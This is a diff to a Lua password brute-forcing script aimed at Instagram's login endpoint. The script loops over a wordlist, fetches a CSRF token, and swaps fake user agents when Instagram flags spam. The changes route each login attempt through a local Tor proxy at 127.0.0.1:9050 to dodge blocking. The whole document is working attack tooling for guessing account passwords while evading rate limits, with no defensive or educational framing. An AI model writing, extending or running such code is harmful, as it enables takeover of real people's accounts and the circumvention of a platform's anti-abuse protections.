@@ -30,6 +30,13 @@ local request_payload = [[queryParams={}&optIntoOneTap=false]]
 local csrf = nil
 local request_headers = nil
 
+local function get_proxy_server()
+	local proxy = {
+		"127.0.0.1:9050"
+	}
+	return (proxy[math.random(#proxy)])
+end
+
 local function get_csrf_token()
 	repeat
 		body,code,headers = http.request {
@@ -58,10 +65,10 @@ local function attack(password, proxy)
 		url = "https://instagram.com/accounts/login/ajax/",
 		method = "POST",
 		headers = request_headers,
+		proxy = proxy,
 		source = ltn.source.string(request_payload),
 		sink = ltn.sink.table(attack_response)
 	}
-
 	for _,resp in pairs(attack_response) do
 		print(resp)
 		return resp
@@ -108,7 +115,7 @@ local function main()
 	request_headers["x-csrftoken"] = get_csrf_token()
     -- Checking if --wordlist exist TODO find better way with argparse
 	for pass in io.lines(args.wordlist) do
-		attack(pass, "enable")
+		attack(pass, get_proxy_server())
 		if (attack(pass, "enable")):find("message") then
 			print("[-] instagram detected spam attack\n[+] generating new user-agent")
 			request_headers["User-Agent"] = fake_Agents()
